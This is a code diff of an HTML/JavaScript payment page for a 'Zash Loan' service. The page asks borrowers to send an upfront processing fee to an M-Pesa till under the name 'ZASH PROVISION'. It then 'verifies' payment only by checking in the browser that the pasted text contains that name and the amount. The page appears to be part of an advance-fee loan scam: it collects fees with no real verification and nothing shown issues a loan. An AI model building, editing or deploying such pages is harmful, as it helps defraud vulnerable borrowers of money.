@@ -6,68 +6,58 @@
   <title>Verification - Zash Loan</title>
   <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="bg-gradient-to-br from-blue-900 via-blue-700 to-gray-100 min-h-screen p-4 flex items-center justify-center text-blue-900">
+<body class="bg-gradient-to-br from-red-900 via-red-600 to-red-300 min-h-screen p-4 flex items-center justify-center text-red-900">
 
   <div class="bg-white/90 backdrop-blur-md max-w-sm w-full rounded-2xl shadow-2xl p-6 relative">
-    
-    <!-- Logo -->
-    <div class="absolute top-4 left-4">
-      <img src="logo.png" alt="Zash Loan Logo" class="w-10 h-10 rounded-full">
+    <div class="text-left mb-4 flex items-center gap-2">
+      <img src="logo.png" alt="Zash Loan Logo" class="h-8 w-8">
+      <h2 class="text-xl font-bold text-red-800">Zash Loan Payment</h2>
     </div>
 
-    <div class="text-center mb-4 mt-4">
-      <h2 class="text-2xl font-bold text-blue-800">Payment Verification</h2>
-      <p class="text-sm text-gray-600">Please complete your processing fee payment to continue.</p>
-    </div>
+    <p class="text-sm text-gray-700 mb-3">Complete the payment to continue processing your loan.</p>
 
-    <div class="bg-blue-50 border border-blue-200 rounded-xl p-4 text-sm mb-4">
+    <div class="bg-red-50 border border-red-300 rounded-xl p-4 text-sm mb-4">
       <p><strong>Name:</strong> <span id="borrowerName">...</span></p>
       <p><strong>Loan Amount:</strong> Ksh <span id="loanAmount">...</span></p>
       <p><strong>Processing Fee:</strong> Ksh <span id="processingFee">...</span></p>
     </div>
 
-    <div class="bg-blue-100 p-4 rounded-xl mb-4 text-sm text-gray-800">
-      <p class="font-semibold mb-2">How to pay via M-Pesa:</p>
+    <div class="bg-red-100 p-4 rounded-xl mb-4 text-sm text-gray-800">
+      <p class="font-semibold mb-2">Pay via M-Pesa:</p>
       <ul class="space-y-1">
-        <li>Go to M-PESA: <strong>M-PESA</strong></li>
-        <li>Lipa na M-PESA: <strong>Paybill</strong></li>
+        <li>Go to <strong>M-PESA</strong></li>
+        <li>Choose <strong>Buy Goods and Services</strong></li>
         <li>
-          Business Number: 
+          Till Number: 
           <strong id="tillNumber">9824375</strong>
-          <button onclick="copyTill()" class="ml-2 text-xs text-blue-600 underline">Copy</button>
+          <button onclick="copyTill()" class="ml-2 text-xs text-red-600 underline">Copy</button>
         </li>
-        <li>Account: <strong>Your ID Number</strong></li>
-        <li>Enter Amount: <strong id="amountToPay">Ksh ...</strong></li>
-        <li>Enter your M-PESA PIN</li>
-        <li><strong>ZASH LOAN PAYBILL</strong></li>
+        <li>Amount: <strong id="amountToPay">Ksh ...</strong></li>
+        <li>Business Name: <strong>ZASH PROVISION</strong></li>
       </ul>
     </div>
 
     <button onclick="window.location.href='checklimit.html'"
-            class="w-full mb-4 bg-gray-100 hover:bg-gray-200 text-blue-800 font-medium py-2 rounded-xl">
-      Change Loan Limit
+            class="w-full mb-4 bg-gray-100 hover:bg-gray-200 text-red-700 font-medium py-2 rounded-xl">
+      Change Loan Details
     </button>
 
     <label for="mpesaMessage" class="block mb-1 text-sm font-medium text-gray-700">Paste M-PESA Confirmation Message:</label>
-    <textarea id="mpesaMessage" rows="3" placeholder="Paste message here..." class="w-full p-3 border border-blue-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm mb-4"></textarea>
+    <textarea id="mpesaMessage" rows="3" placeholder="Enter confirmation message..." class="w-full p-3 border border-red-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-red-500 text-sm mb-4"></textarea>
 
-    <button onclick="verifyPayment()" class="w-full bg-blue-700 hover:bg-blue-800 text-white font-semibold py-3 rounded-xl transition">
+    <button onclick="verifyPayment()" class="w-full bg-red-700 hover:bg-red-800 text-white font-semibold py-3 rounded-xl transition">
       Verify Payment
     </button>
 
-    <p id="status" class="text-center mt-4 text-sm text-red-500 hidden">❌ Verification failed. Check message content.</p>
-
-    <footer class="mt-6 text-xs text-center text-gray-500">
-      &copy; 2025 Zash Loan. All rights reserved.
-    </footer>
+    <p id="status" class="text-center mt-4 text-sm text-red-600 hidden">❌ Verification failed. Check your message.</p>
   </div>
 
   <!-- ✅ Popup Modal -->
   <div id="popupOverlay" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
-    <div class="bg-white text-blue-900 rounded-2xl p-6 w-11/12 max-w-sm text-center shadow-xl">
+    <div class="bg-white text-red-900 rounded-2xl p-6 w-11/12 max-w-sm text-center shadow-xl">
       <h2 class="text-xl font-bold mb-2">✅ Payment Verified</h2>
       <p class="text-sm mb-4">Thank you, <strong id="popupUser">User</strong>.</p>
-      <p class="text-sm">Your payment of <strong id="popupFee">Ksh ...</strong> for loan <strong id="popupLoan">Ksh ...</strong> has been confirmed.</p>
+      <p class="text-sm">Your payment of <strong id="popupFee">Ksh ...</strong> for a loan of <strong id="popupLoan">Ksh ...</strong> has been confirmed.</p>
     </div>
   </div>
 
@@ -83,16 +73,16 @@
 
     function copyTill() {
       navigator.clipboard.writeText("9824375").then(() => {
-        alert("Paybill number copied to clipboard!");
+        alert("Till number copied!");
       });
     }
 
     function verifyPayment() {
       const message = document.getElementById("mpesaMessage").value.toUpperCase();
-      const expected = "ZASH LOAN PAYBILL";
+      const expected = "ZASH PROVISION";
       const amountMatch = processingFee;
 
-      if (message.includes("9824375") && message.includes(amountMatch)) {
+      if (message.includes(expected) && message.includes(amountMatch)) {
         document.getElementById("popupUser").textContent = name;
         document.getElementById("popupFee").textContent = parseInt(processingFee).toLocaleString();
         document.getElementById("popupLoan").textContent = parseInt(loanAmount).toLocaleString();
